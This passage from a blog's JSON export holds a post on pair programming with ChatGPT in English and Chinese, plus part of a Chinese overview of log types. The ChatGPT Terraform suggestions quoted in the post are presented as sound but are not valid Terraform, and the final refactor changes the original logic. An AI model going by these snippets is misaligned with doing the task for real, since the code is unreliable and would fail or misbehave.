&quot;aaa,bbb,ccc,$&#123;var.b&#125;&quot; : &quot;$&#123;var.a&#125;,aaa,bbb,ccc,$&#123;var.b&#125;&quot; &#125; Response The code seems fine in terms of syntax, but if you’re looking for suggestions, here are a few: It’s always a good idea to use meaningful names for your resources, so you can easily identify them later. Instead of “some_resource” and “resource_name”, try to come up with more descriptive names. In the value attribute, it’s generally better to avoid using ternary operators for complex expressions, as they can make the code harder to read and understand. Instead, consider breaking the expression into multiple lines, or creating a separate variable that holds the computed value. Consider using interpolation syntax (${…}) only when necessary. In this case, since var.a and var.b are already variables, you can simply concatenate them with the other strings using the + operator. Here’s an example of how you could refactor the code with these suggestions: resource &quot;some_resource&quot; &quot;example&quot; &#123; name &#x3D; &quot;example_resource&quot; value &#x3D; compute_value(var.a, var.b, condition) &#125; &#x2F;&#x2F; Define a separate function to compute the value &#x2F;&#x2F; This makes the code easier to read and understand &#x2F;&#x2F; and allows for reuse if needed locals &#123; compute_value &#x3D; (a, b, condition) &#x3D;&gt; &#123; if condition &#123; &quot;aaa,bbb,ccc,&quot; + b &#125; else &#123; a + &quot;,aaa,bbb,ccc,&quot; + b &#125; &#125; &#125; This code uses a local variable to define a separate function that computes the value based on the input variables and the condition flag. This makes the code easier to read and understand, and also allows for reuse if needed. With the magic question can you propose better coding? you have much meaningful result. Although it is not able to spot I am repeating part of the variable (,aaa,bbb,ccc,$&#123;var.b&#125;), which goes against the DRY principle. I have rewritten a bit and asked again as below, Try #3, ask for opinion from 2 pieces of my code Prompt: which terraform code is better, can you propose better coding? code 1, resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; condition &#x3D;&#x3D; true ? &quot;aaa,bbb,ccc,$&#123;var.b&#125;&quot; : &quot;$&#123;var.a&#125;,aaa,bbb,ccc,$&#123;var.b&#125;&quot; &#125; code2, locals &#123; a &#x3D; &#123; &quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;, var.b, &#125; &#125; resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; join(&quot;,&quot;, condition &#x3D;&#x3D; true ? [] : var.a, local.a) &#125; Response Both code examples are valid and functional, but they have different purposes and implementations. Code 1 uses a ternary operator to set the “value” attribute of the “some_resource” resource based on a condition. It’s a concise way of setting the attribute, but it can be less readable for more complex expressions. Code 2 uses a local variable to create a list of values to be joined together. It uses the “join” function to concatenate the values in the list with a comma as a separator. This approach can be more readable for longer lists of values and expressions. Ultimately, the choice between these two code examples depends on the specific needs and requirements of your infrastructure. If you have a small list of values and a simple condition, Code 1 might be more appropriate. If you have a longer list of values and a more complex expression, Code 2 might be more appropriate. To propose a better coding, I would suggest combining the best parts of both code examples to create a more readable, maintainable, and extensible code. locals &#123; some_values &#x3D; [ &quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;, var.b, ] &#125; resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; join(&quot;,&quot;, concat(var.a, condition ? [] : local.some_values)) &#125; In this code, we use a local variable to store the hardcoded values and the “var.b” variable. Then, we concatenate the values of the “var.a” and local variable using the “concat” function. Finally, we use the “join” function to concatenate the values with a comma separator. This code is more readable, maintainable, and extensible than the previous examples. It separates the hardcoded values from the variables, uses a more readable “concat” function instead of the ternary operator, and uses a more concise “join” function. Which combines improvements from both human and AI! However, I will use try #2 most likely as is effortless. Advantages of ChatGPT in Pair Programming Here are some of the key advantages of using ChatGPT in pair programming, instead of another human: 24/7 Availability: ChatGPT is always available, allowing you to work on projects whenever inspiration strikes, without waiting for a fellow developer. Instant Feedback: Receive feedback on your code in real-time, streamlining your development process. Consistency: ChatGPT offers consistent feedback quality, free from human bias or mood fluctuations. Diversity: ChatGPT can provide diverse perspectives and insights that a human pair programmer may not have. This can lead to more creative and innovative solutions. Learning Opportunities: By observing ChatGPT’s suggestions and code reviews, developers can learn new coding techniques and best practices. Potential drawback As shown in the example you should notice if you don’t provide enough background or ask the correct question, the review result is not satisfactory. GitHub Copilot with Visual Studio Code I found it helps in code complete but it lacks interactivity for now. A New Era of Collaboration Pair programming with ChatGPT is a game-changer. It offers a powerful synergy between human developers and AI, streamlining the development process and offering new learning opportunities. While it can never replace the creativity and problem-solving capabilities of a human developer, ChatGPT is an invaluable tool in the modern developer’s arsenal. So, give it a try and experience the future of pair programming for yourself!","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}]},{"title":"與 ChatGPT 結對程式設計 - 開發者的夢想成真","slug":"2023/03/Pair_Programming_with_ChatGPT_A_Developer_s_Dream_Come_True-zh-TW","date":"un44fin44","updated":"un00fin00","comments":true,"path":"/zh-TW/2023/03/Pair_Programming_with_ChatGPT_A_Developer_s_Dream_Come_True/","permalink":"https://neo01.com/zh-TW/2023/03/Pair_Programming_with_ChatGPT_A_Developer_s_Dream_Come_True/","excerpt":"ChatGPT 不是取代開發者，而是最佳結對夥伴！學習如何用魔法問題獲得更好的程式碼審查。","text":"作為一名全端開發者，多年來我與許多人類進行過結對程式設計。然而，最近我有機會與 ChatGPT（由 OpenAI 訓練的大型語言模型）合作，這是一個改變遊戲規則的體驗。我發現 ChatGPT 並沒有取代我的角色，而是作為結對程式設計的夥伴，為我提供有價值的見解和觀點。讓我們深入了解它如何改變我的結對程式設計體驗！ 人類與 ChatGPT：完美的協同作用 人類開發者與 ChatGPT 之間的合作關係相當獨特。以下是我的典型循環： 需求收集：我們人類開發者提供特定功能或函式的需求。ChatGPT 編寫程式碼，我們人類進行審查。 總結需求：我發現要求 ChatGPT 總結我的需求非常有用，因為我通常不會一次性提供所有需求。這有助於我檢查我們是否在同一頁面上。 單元測試範本：ChatGPT 根據總結的需求生成單元測試範本。 人類完成並精煉單元測試：我們人類開發者完成並精煉單元測試，並向 ChatGPT 提供回饋，精煉他們對任務的理解。 輪到 ChatGPT 審查我的程式碼 反過來，人類可以編寫程式並要求 ChatGPT 審查和總結程式碼。這個過程有助於識別潛在問題並確保程式碼符合所需的需求。然而，有時您可能需要稍微幫助 ChatGPT，而不是直接丟一段程式碼。例如， 嘗試 #1，簡單地要求審查 提示： review following terraform code in main.tf. resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; condition &#x3D;&#x3D; true ? &quot;aaa,bbb,ccc,$&#123;var.b&#125;&quot; : &quot;$&#123;var.a&#125;,aaa,bbb,ccc,$&#123;var.b&#125;&quot; &#125; 回應 您提供的程式碼建立了一個名為「some_resource」的資源，名稱為「resource_name」，並將「name」屬性設定為「some_name」。此外，它根據條件設定「value」屬性。如果「condition」變數為 true，則「value」設定為「aaa,bbb,ccc,${var.b}」。如果「condition」為 false，則「value」設定為「${var.a},aaa,bbb,ccc,${var.b}」。 假設變數「a」、「b」和「condition」已正確定義，程式碼看起來是有效且功能正常的。然而，重要的是確保資源類型及其屬性對於您的基礎設施需求是正確且正確配置的。此外，使用描述性名稱來命名資源和屬性是一個好習慣，以便更容易理解程式碼的目的。 以上聽起來毫無意義。讓我們稍微精煉一下我們的問題 嘗試 #2，告訴您想從程式碼審查中得到什麼 提示： review following terraform code in main.tf. can you propose better coding? resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; condition &#x3D;&#x3D; true ? &quot;aaa,bbb,ccc,$&#123;var.b&#125;&quot; : &quot;$&#123;var.a&#125;,aaa,bbb,ccc,$&#123;var.b&#125;&quot; &#125; 回應 程式碼在語法方面看起來不錯，但如果您正在尋找建議，這裡有一些： 為您的資源使用有意義的名稱總是一個好主意，這樣您以後可以輕鬆識別它們。不要使用「some_resource」和「resource_name」，嘗試想出更具描述性的名稱。 在 value 屬性中，通常最好避免對複雜表達式使用三元運算子，因為它們會使程式碼更難閱讀和理解。相反，考慮將表達式分成多行，或建立一個保存計算值的單獨變數。 考慮僅在必要時使用插值語法（${…}）。在這種情況下，由於 var.a 和 var.b 已經是變數，您可以簡單地使用 + 運算子將它們與其他字串連接起來。 以下是如何使用這些建議重構程式碼的範例： resource &quot;some_resource&quot; &quot;example&quot; &#123; name &#x3D; &quot;example_resource&quot; value &#x3D; compute_value(var.a, var.b, condition) &#125; &#x2F;&#x2F; Define a separate function to compute the value &#x2F;&#x2F; This makes the code easier to read and understand &#x2F;&#x2F; and allows for reuse if needed locals &#123; compute_value &#x3D; (a, b, condition) &#x3D;&gt; &#123; if condition &#123; &quot;aaa,bbb,ccc,&quot; + b &#125; else &#123; a + &quot;,aaa,bbb,ccc,&quot; + b &#125; &#125; &#125; 此程式碼使用局部變數來定義一個單獨的函式，該函式根據輸入變數和條件標誌計算值。這使得程式碼更容易閱讀和理解，並且如果需要還允許重複使用。 使用神奇的問題*你能提出更好的編碼嗎？*您會得到更有意義的結果。儘管它無法發現我正在重複部分變數（,aaa,bbb,ccc,$&#123;var.b&#125;），這違反了 DRY 原則。我稍微重寫了一下並再次詢問，如下所示， 嘗試 #3，詢問對我的兩段程式碼的意見 提示： which terraform code is better, can you propose better coding? code 1, resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; condition &#x3D;&#x3D; true ? &quot;aaa,bbb,ccc,$&#123;var.b&#125;&quot; : &quot;$&#123;var.a&#125;,aaa,bbb,ccc,$&#123;var.b&#125;&quot; &#125; code2, locals &#123; a &#x3D; &#123; &quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;, var.b, &#125; &#125; resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; join(&quot;,&quot;, condition &#x3D;&#x3D; true ? [] : var.a, local.a) &#125; 回應 兩個程式碼範例都是有效且功能正常的，但它們有不同的目的和實作。 程式碼 1 使用三元運算子根據條件設定「some_resource」資源的「value」屬性。這是設定屬性的簡潔方式，但對於更複雜的表達式可能可讀性較差。 程式碼 2 使用局部變數來建立要連接在一起的值列表。它使用「join」函式將列表中的值與逗號作為分隔符連接起來。對於較長的值列表和表達式，這種方法可能更具可讀性。 最終，這兩個程式碼範例之間的選擇取決於您的基礎設施的特定需求和要求。如果您有一個小的值列表和一個簡單的條件，程式碼 1 可能更合適。如果您有一個較長的值列表和一個更複雜的表達式，程式碼 2 可能更合適。 為了提出更好的編碼，我建議結合兩個程式碼範例的最佳部分，以建立更具可讀性、可維護性和可擴展性的程式碼。 locals &#123; some_values &#x3D; [ &quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;, var.b, ] &#125; resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; join(&quot;,&quot;, concat(var.a, condition ? [] : local.some_values)) &#125; 在此程式碼中，我們使用局部變數來儲存硬編碼值和「var.b」變數。然後，我們使用「concat」函式連接「var.a」和局部變數的值。最後，我們使用「join」函式將值與逗號分隔符連接起來。 此程式碼比以前的範例更具可讀性、可維護性和可擴展性。它將硬編碼值與變數分開，使用更具可讀性的「concat」函式而不是三元運算子，並使用更簡潔的「join」函式。 這結合了人類和 AI 的改進！然而，我最有可能使用嘗試 #2，因為它毫不費力。 ChatGPT 在結對程式設計中的優勢 以下是在結對程式設計中使用 ChatGPT 而不是另一個人類的一些主要優勢： 全天候可用性：ChatGPT 始終可用，讓您可以在靈感來襲時隨時處理專案，而無需等待其他開發者。 即時回饋：即時接收有關您的程式碼的回饋，簡化您的開發流程。 一致性：ChatGPT 提供一致的回饋品質，不受人類偏見或情緒波動的影響。 多樣性：ChatGPT 可以提供人類結對程式設計師可能沒有的多樣化觀點和見解。這可以帶來更具創意和創新的解決方案。 學習機會：透過觀察 ChatGPT 的建議和程式碼審查，開發者可以學習新的編碼技術和最佳實踐。 潛在缺點 如範例所示，您應該注意，如果您沒有提供足夠的背景或提出正確的問題，審查結果將不令人滿意。 GitHub Copilot 與 Visual Studio Code 我發現它有助於程式碼完成，但目前缺乏互動性。 協作的新時代 與 ChatGPT 的結對程式設計是一個改變遊戲規則的體驗。它在人類開發者和 AI 之間提供了強大的協同作用，簡化了開發流程並提供了新的學習機會。雖然它永遠無法取代人類開發者的創造力和解決問題的能力，但 ChatGPT 是現代開發者工具庫中的寶貴工具。所以，試試看，親自體驗結對程式設計的未來！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}],"lang":"zh-TW"},{"title":"与 ChatGPT 结对编程 - 开发者的梦想成真","slug":"2023/03/Pair_Programming_with_ChatGPT_A_Developer_s_Dream_Come_True-zh-CN","date":"un44fin44","updated":"un00fin00","comments":true,"path":"/zh-CN/2023/03/Pair_Programming_with_ChatGPT_A_Developer_s_Dream_Come_True/","permalink":"https://neo01.com/zh-CN/2023/03/Pair_Programming_with_ChatGPT_A_Developer_s_Dream_Come_True/","excerpt":"ChatGPT 不是取代开发者，而是最佳结对伙伴！学习如何用魔法问题获得更好的代码审查。","text":"作为一名全栈开发者，多年来我与许多人类进行过结对编程。然而，最近我有机会与 ChatGPT（由 OpenAI 训练的大型语言模型）合作，这是一个改变游戏规则的体验。我发现 ChatGPT 并没有取代我的角色，而是作为结对编程的伙伴，为我提供有价值的见解和观点。让我们深入了解它如何改变我的结对编程体验！ 人类与 ChatGPT：完美的协同作用 人类开发者与 ChatGPT 之间的合作关系相当独特。以下是我的典型循环： 需求收集：我们人类开发者提供特定功能或函数的需求。ChatGPT 编写代码，我们人类进行审查。 总结需求：我发现要求 ChatGPT 总结我的需求非常有用，因为我通常不会一次性提供所有需求。这有助于我检查我们是否在同一页面上。 单元测试模板：ChatGPT 根据总结的需求生成单元测试模板。 人类完成并精炼单元测试：我们人类开发者完成并精炼单元测试，并向 ChatGPT 提供反馈，精炼他们对任务的理解。 轮到 ChatGPT 审查我的代码 反过来，人类可以编写程序并要求 ChatGPT 审查和总结代码。这个过程有助于识别潜在问题并确保代码符合所需的需求。然而，有时您可能需要稍微帮助 ChatGPT，而不是直接丢一段代码。例如， 尝试 #1，简单地要求审查 提示： review following terraform code in main.tf. resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; condition &#x3D;&#x3D; true ? &quot;aaa,bbb,ccc,$&#123;var.b&#125;&quot; : &quot;$&#123;var.a&#125;,aaa,bbb,ccc,$&#123;var.b&#125;&quot; &#125; 回应 您提供的代码创建了一个名为&quot;some_resource&quot;的资源，名称为&quot;resource_name&quot;，并将&quot;name&quot;属性设置为&quot;some_name&quot;。此外，它根据条件设置&quot;value&quot;属性。如果&quot;condition&quot;变量为 true，则&quot;value&quot;设置为&quot;aaa,bbb,ccc,${var.b}“。如果&quot;condition&quot;为 false，则&quot;value&quot;设置为”${var.a},aaa,bbb,ccc,${var.b}&quot;。 假设变量&quot;a&quot;、&quot;b&quot;和&quot;condition&quot;已正确定义，代码看起来是有效且功能正常的。然而，重要的是确保资源类型及其属性对于您的基础设施需求是正确且正确配置的。此外，使用描述性名称来命名资源和属性是一个好习惯，以便更容易理解代码的目的。 以上听起来毫无意义。让我们稍微精炼一下我们的问题 尝试 #2，告诉您想从代码审查中得到什么 提示： review following terraform code in main.tf. can you propose better coding? resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; condition &#x3D;&#x3D; true ? &quot;aaa,bbb,ccc,$&#123;var.b&#125;&quot; : &quot;$&#123;var.a&#125;,aaa,bbb,ccc,$&#123;var.b&#125;&quot; &#125; 回应 代码在语法方面看起来不错，但如果您正在寻找建议，这里有一些： 为您的资源使用有意义的名称总是一个好主意，这样您以后可以轻松识别它们。不要使用&quot;some_resource&quot;和&quot;resource_name&quot;，尝试想出更具描述性的名称。 在 value 属性中，通常最好避免对复杂表达式使用三元运算符，因为它们会使代码更难阅读和理解。相反，考虑将表达式分成多行，或创建一个保存计算值的单独变量。 考虑仅在必要时使用插值语法（${…}）。在这种情况下，由于 var.a 和 var.b 已经是变量，您可以简单地使用 + 运算符将它们与其他字符串连接起来。 以下是如何使用这些建议重构代码的示例： resource &quot;some_resource&quot; &quot;example&quot; &#123; name &#x3D; &quot;example_resource&quot; value &#x3D; compute_value(var.a, var.b, condition) &#125; &#x2F;&#x2F; Define a separate function to compute the value &#x2F;&#x2F; This makes the code easier to read and understand &#x2F;&#x2F; and allows for reuse if needed locals &#123; compute_value &#x3D; (a, b, condition) &#x3D;&gt; &#123; if condition &#123; &quot;aaa,bbb,ccc,&quot; + b &#125; else &#123; a + &quot;,aaa,bbb,ccc,&quot; + b &#125; &#125; &#125; 此代码使用局部变量来定义一个单独的函数，该函数根据输入变量和条件标志计算值。这使得代码更容易阅读和理解，并且如果需要还允许重复使用。 使用神奇的问题*你能提出更好的编码吗？*您会得到更有意义的结果。尽管它无法发现我正在重复部分变量（,aaa,bbb,ccc,$&#123;var.b&#125;），这违反了 DRY 原则。我稍微重写了一下并再次询问，如下所示， 尝试 #3，询问对我的两段代码的意见 提示： which terraform code is better, can you propose better coding? code 1, resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; condition &#x3D;&#x3D; true ? &quot;aaa,bbb,ccc,$&#123;var.b&#125;&quot; : &quot;$&#123;var.a&#125;,aaa,bbb,ccc,$&#123;var.b&#125;&quot; &#125; code2, locals &#123; a &#x3D; &#123; &quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;, var.b, &#125; &#125; resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; join(&quot;,&quot;, condition &#x3D;&#x3D; true ? [] : var.a, local.a) &#125; 回应 两个代码示例都是有效且功能正常的，但它们有不同的目的和实现。 代码 1 使用三元运算符根据条件设置&quot;some_resource&quot;资源的&quot;value&quot;属性。这是设置属性的简洁方式，但对于更复杂的表达式可能可读性较差。 代码 2 使用局部变量来创建要连接在一起的值列表。它使用&quot;join&quot;函数将列表中的值与逗号作为分隔符连接起来。对于较长的值列表和表达式，这种方法可能更具可读性。 最终，这两个代码示例之间的选择取决于您的基础设施的特定需求和要求。如果您有一个小的值列表和一个简单的条件，代码 1 可能更合适。如果您有一个较长的值列表和一个更复杂的表达式，代码 2 可能更合适。 为了提出更好的编码，我建议结合两个代码示例的最佳部分，以创建更具可读性、可维护性和可扩展性的代码。 locals &#123; some_values &#x3D; [ &quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;, var.b, ] &#125; resource &quot;some_resource&quot; &quot;resource_name&quot; &#123; name &#x3D; &quot;some_name&quot; value &#x3D; join(&quot;,&quot;, concat(var.a, condition ? [] : local.some_values)) &#125; 在此代码中，我们使用局部变量来存储硬编码值和&quot;var.b&quot;变量。然后，我们使用&quot;concat&quot;函数连接&quot;var.a&quot;和局部变量的值。最后，我们使用&quot;join&quot;函数将值与逗号分隔符连接起来。 此代码比以前的示例更具可读性、可维护性和可扩展性。它将硬编码值与变量分开，使用更具可读性的&quot;concat&quot;函数而不是三元运算符，并使用更简洁的&quot;join&quot;函数。 这结合了人类和 AI 的改进！然而，我最有可能使用尝试 #2，因为它毫不费力。 ChatGPT 在结对编程中的优势 以下是在结对编程中使用 ChatGPT 而不是另一个人类的一些主要优势： 全天候可用性：ChatGPT 始终可用，让您可以在灵感来袭时随时处理项目，而无需等待其他开发者。 即时反馈：即时接收有关您的代码的反馈，简化您的开发流程。 一致性：ChatGPT 提供一致的反馈质量，不受人类偏见或情绪波动的影响。 多样性：ChatGPT 可以提供人类结对编程师可能没有的多样化观点和见解。这可以带来更具创意和创新的解决方案。 学习机会：通过观察 ChatGPT 的建议和代码审查，开发者可以学习新的编码技术和最佳实践。 潜在缺点 如示例所示，您应该注意，如果您没有提供足够的背景或提出正确的问题，审查结果将不令人满意。 GitHub Copilot 与 Visual Studio Code 我发现它有助于代码完成，但目前缺乏交互性。 协作的新时代 与 ChatGPT 的结对编程是一个改变游戏规则的体验。它在人类开发者和 AI 之间提供了强大的协同作用，简化了开发流程并提供了新的学习机会。虽然它永远无法取代人类开发者的创造力和解决问题的能力，但 ChatGPT 是现代开发者工具库中的宝贵工具。所以，试试看，亲自体验结对编程的未来！","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"},{"name":"terraform","slug":"terraform","permalink":"https://neo01.com/tags/terraform/"}],"lang":"zh-CN"},{"title":"理解日志：系统的沉默守护者","slug":"2023/02/Understanding_Logs_The_Silent_Guardians_of_Your_Systems-zh-CN","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-CN/2020/06/Understanding_Logs_The_Silent_Guardians_of_Your_Systems/","permalink":"https://neo01.com/zh-CN/2020/06/Understanding_Logs_The_Silent_Guardians_of_Your_Systems/","excerpt":"从应用程序日志到 SIEM——探索不同类型的日志如何协同运作，保护系统安全、性能与合规。了解何时使用各种日志类型，以及它们如何形成完整的可观测性策略。","text":"还记得上次应用程序在生产环境崩溃吗？你可能做了每个开发者都会做的事：疯狂地搜索日志文件，试图拼凑出问题所在。也许你在数千条 INFO 消息中找到了一个神秘的错误消息，或者更糟——发现关键错误根本没有被记录。 日志是我们系统的沉默守护者，持续记录着幕后发生的一切。但并非所有日志都是平等的。从追踪代码执行的简单应用程序日志，到检测网络威胁的复杂安全信息与事件管理（SIEM）系统，日志的领域广阔且常被误解。 从简单的调试打印语句开始，已经演变成一个复杂的专业日志系统生态系统，各自服务于不同的目的。现今的现代基础设施每秒产生数百万条日志记录，理解该收集哪些日志、如何存储它们，以及何时分析它们，可能意味着在几分钟内捕捉到安全漏洞，或是几个月后才发现的差异。 💡 什么是日志？日志是系统、应用程序或网络中发生事件的时间戳记录。它们捕获从例行操作到关键错误的所有内容，为故障排除、安全分析、合规性和性能优化提供审计轨迹。 日志的演进：从打印语句到可观测性 日志的开始很简单。在早期的计算时代，开发者使用打印语句来理解代码在做什么。如果出了问题，你会加入更多打印语句、重新编译，然后再次运行。这是调试时代——粗糙但对小型程序有效。 随着系统变得更复杂，结构化日志出现了。开发者不再使用随机的打印语句，而是采用提供严重性级别（DEBUG、INFO、WARN、ERROR）、时间戳和一致格式的日志框架。这标志着结构化日志时代，日志变得可解析和可搜索，而不仅仅是人类可读的文本。 然后出现了分布式系统和微服务。单一用户请求可能会触及数十个服务，每个服务都产生自己的日志。关联这些日志变得至关重要，导致了集中式日志时代。像 ELK Stack（Elasticsearch、Logstash、Kibana）和 Splunk 这样的工具出现，用于聚合、搜索和可视化来自多个来源的日志。 今天，我们处于可观测性时代。日志只是可观测性的一个支柱，与指标和追踪一起工作，提供完整的系统可见性。现代平台将日志与性能指标、分布式追踪和安全事件关联起来，为团队提供前所未有的系统行为洞察。 timeline title 日志的演进 1960s-1980s : 调试时代 : 打印语句和控制台输出 : 手动日志审查 1990s-2000s : 结构化日志时代 : 日志框架（log4j、syslog） : 严重性级别和格式化 2000s-2010s : 集中式日志时代 : 日志聚合平台 : ELK Stack、Splunk 2010s-Present : 可观测性时代 : 日志 + 指标 + 追踪 : AI 驱动的分析 : 实时关联 日志类型：全面的分类 理解不同类型的日志及其目的，对于构建强健的系统至关重要。让我们探索主要类别以及何时使用每一种。 应用程序日志 应用程序日志记录软件代码中的事件——函数调用、变量值、业务逻辑执行和错误。这些是开发者最常交互的日志。 它们捕获什么： 函数进入和退出点 关键时刻的变量值 业务逻辑决策（例如，“用户符合折扣资格”） 异常和错误堆栈跟踪 操作的性能计时 常见严重性级别： TRACE：极其详细的信息，通常仅在开发期间启用 DEBUG：对诊断问题有用的详细信息 INFO：关于应用程序流程的一般信息消息 WARN：可能有害但尚未成为错误的情况 ERROR：可能仍允许应用程序继续的错误事件 FATAL：导致应用程序终止的严重错误 最佳实践： 使用结构化日志格式（JSON）以便更容易解析 包含关联 ID 以追踪跨服务的请求 避免记录敏感数据（密码、信用卡、个人识别信息） 为不同环境设置适当的日志级别（开发环境用 DEBUG，生产环境用 INFO） 实施日志轮转以防止磁盘空间耗尽 🎬 真实世界的应用程序日志{ &quot;timestamp&quot;: &quot;2020-06-15T14:32:18.123Z&quot;, &quot;level&quot;: &quot;ERROR&quot;, &quot;service&quot;: &quot;payment-service&quot;, &quot;correlationId&quot;: &quot;abc-123-def-456&quot;, &quot;message&quot;: &quot;Payment processing failed&quot;, &quot;error&quot;: &quot;Gateway timeout&quot;, &quot;userId&quot;: &quot;user_789&quot;, &quot;amount&quot;: 99.99, &quot;stackTrace&quot;: &quot;...&quot; &#125; 这种结构化格式使得搜索与特定用户、关联 ID 或错误类型相关的所有错误变得容易。 系统日志 系统日志捕获操作系统和基础设施事件——服务器启动、硬件故障、内核消息和系统服务状态变更。 它们捕获什么： 开机和关机事件 硬件错误（磁盘故障、内存问题） 内核消息和驱动程序事件 系统服务状态（已启动、已停止、失败） 资源耗尽警告 常见系统日志类型： syslog：Unix/Linux 标准日志协议 Windows 事件日志：Windows 系统事件记录 journald：现代 Linux 日志系统（systemd） dmesg：内核环形缓冲区消息 为什么它们重要： 系统日志通常提供硬件故障、安全漏洞或配置问题的早期警告信号。磁盘错误的突然激增可能预测即将发生的磁盘驱动器故障，而异常的身份验证尝试可能表示暴力攻击。 安全日志 安全日志追踪身份验证、授权和安全相关事件。这些对于检测漏洞、调查事件和满足合规要求至关重要。 它们捕获什么： 登录尝试（成功和失败） 权限变更和权限提升 防火墙允许/拒绝决策 入侵检测系统（IDS）警报 数据访问和修改事件 安全策略违规 关键安全日志来源： 身份验证日志：谁登录、何时以及从哪里 防火墙日志：允许或阻止的网络流量 IDS/IPS 日志：检测到的入侵尝试 防病毒日志：恶意软件检测和隔离事件 VPN 日志：远程访问连接 数据库审计日志：敏感数据访问 合规要求： 许多法规要求保留安全日志： PCI DSS：90 天在线，1 年归档（支付卡数据） HIPAA：6 年（医疗保健数据） SOX：7 年（财务记录） GDPR：依目的和法律依据而异 ⚠️ 安全日志最佳实践 保护日志完整性：将日志存储在独立系统上，以防止攻击者掩盖其踪迹 实时监控：不要等到每月审查才检测漏洞 关联事件：单次登录失败是正常的；一分钟内 1000 次就是攻击 加密敏感日志：日志可能包含敏感信息 实施篡改检测：使用加密哈希来检测日志修改 审计日志 审计日志提供详细、不可变的记录，记载谁做了什么、何时以及在哪里。与一般应用程序日志不同，审计日志专门设计用于合规性、取证和问责制。 它们捕获什么： 用户操作（创建、读取、更新、删除） 管理变更（配置、权限） 数据访问和修改 系统配置变更 策略违规 关键特征： 不可变：一旦写入，审计日志永远不应被修改或删除 全面：捕获所有相关上下文（谁、什么、何时、哪里、为什么） 防篡改：使用加密技术检测修改 长期保留：通常保留数年以满足合规要求 审计日志 vs 应用程序日志： 方面 应用程序日志 审计日志 目的 调试、故障排除 合规性、问责制 受众 开发者、运维人员 审计员、法务、安全 保留期 数天到数周 数月到数年 可变性 可以轮转/删除 不可变 详细程度 技术细节 业务操作 🎯 审计日志示例{ &quot;timestamp&quot;: &quot;2020-06-15T14:32:18.123Z&quot;, &quot;actor&quot;: &#123; &quot;userId&quot;: &quot;admin_123&quot;, &quot;ipAddress&quot;: &quot;192.168.1.100&quot;, &quot;userAgent&quot;: &quot;Mozilla&#x2F;5.0...&quot; &#125;, &quot;action&quot;: &quot;DELETE&quot;, &quot;resource&quot;: &#123; &quot;type&quot;: &quot;customer_record&quot;, &quot;id&quot;: &quot;cust_456&quot;, &quot;name&quot;: &quot;John Doe&quot; &#125;, &quot;result&quot;: &quot;SUCCESS&quot;, &quot;reason&quot;: &quot;Customer requested data deletion (GDPR)&quot;, &quot;signature&quot;: &quot;a3f5b8c9d2e1...&quot; &#125; 访问日志 访问日志记录对 Web 服务器、API 和其他网络服务的请求。它们对于理解流量模式、检测攻击和故障排除连接问题至关重要。 它们捕获什么： HTTP 请求（方法、URL、状态码） 客户端信息（IP 地址、用户代理） 响应大小和计时 引用来源和身份验证详细信息 常见格式： Apache Combined Log Format：标准 Web 服务器格式 NGINX 访问日志：类似 Apache，具有自定义选项 AWS CloudFront 日志：CDN 访问日志 API Gateway 日志：API 请求/响应详细信息 使用案例： 流量分析：理解用户行为和热门内容 性能监控：识别缓慢的端点 安全检测：发现 SQL 注入、XSS 尝试、机器人流量 容量规划：根据流量趋势预测基础设施需求 性能日志 性能日志追踪系统和应用程序性能指标——响应时间、资源利用率、吞吐量和瓶颈。 它们捕获什么： 请求/响应延迟 数据库查询执行时间 CPU、内存、磁盘、网络利用率 线程池和连接池指标 缓存命中/未命中率 垃圾回收事件 为什么它们重要： 性能日志有助于在影响用户之前识别瓶颈。数据库查询时间的逐渐增加可能表示缺少索引或数据量增长需要优化。 graph TB A([👤 用户请求]) --> B([🌐 负载均衡器访问日志]) B --> C([🖥️ Web 服务器应用程序日志]) C --> D([💾 数据库查询日志]) D --> C C --> E([📊 性能日志响应时间：250ms]) C --> B B --> A F([🔍 监控系统]) -.收集.-> B F -.收集.-> C F -.收集.-> D F -.收集.-> E style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 事务日志 事务日志记录数据库操作，确保数据完整性并在故障后启用恢复。这些对于维护数据库的 ACID 属性至关重要。 它们捕获什么： 数据库事务（BEGIN、COMMIT、ROLLBACK） 数据修改（INSERT、UPDATE、DELETE） 